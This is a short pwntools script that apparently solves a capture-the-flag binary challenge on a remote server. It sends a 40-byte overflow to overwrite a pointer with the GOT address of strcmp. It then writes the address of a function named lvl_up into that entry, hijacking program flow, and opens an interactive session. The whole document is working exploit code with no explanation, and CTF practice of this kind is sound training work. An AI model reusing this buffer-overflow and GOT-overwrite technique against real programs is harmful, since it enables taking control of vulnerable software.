from pwn import *

p = remote('pwn.jeanne-hack-ctf.org', 9004)

BUFF_SIZE = 40 #how many bytes to reach the second struct 
payload1 = b'0' * BUFF_SIZE 
payload1 += p64(0x000000000404038) #address of strcmp in the got 
payload2 = p64(0x000000000401276)  #address of the function lvl_up 

p.recvuntil(b': ') 
p.sendline(payload1)
p.recvuntil(b': ')  
p.sendline(payload2)
p.interactive()
